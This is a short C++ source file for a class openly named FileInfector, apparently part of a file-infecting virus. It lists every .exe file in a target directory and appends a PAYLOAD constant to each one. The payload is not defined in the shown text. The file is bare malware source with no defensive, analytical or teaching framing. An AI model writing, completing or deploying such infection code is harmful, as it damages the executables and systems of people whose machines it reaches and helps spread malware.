#include <fstream>
#include "FileInfector.h"

void FileInfector::infect(const std::string& targetDir) {
	auto targets = findTargets(targetDir);

	for (const auto& target : targets) {
		injectPayload(target);
	}
}

std::vector<std::string> FileInfector::findTargets(const std::string& dir) {
	std::vector<std::string> targets;

	for (const auto& entry : std::filesystem::directory_iterator(dir)) {
		if (entry.path().extension() == ".exe") {
			targets.push_back(entry.path().string());
		}
	}
	
	return targets;
}

void FileInfector::injectPayload(const std::string& filePath) {
	std::fstream file(filePath, std::ios::app);

	if (file) {
		file << PAYLOAD;
	}
}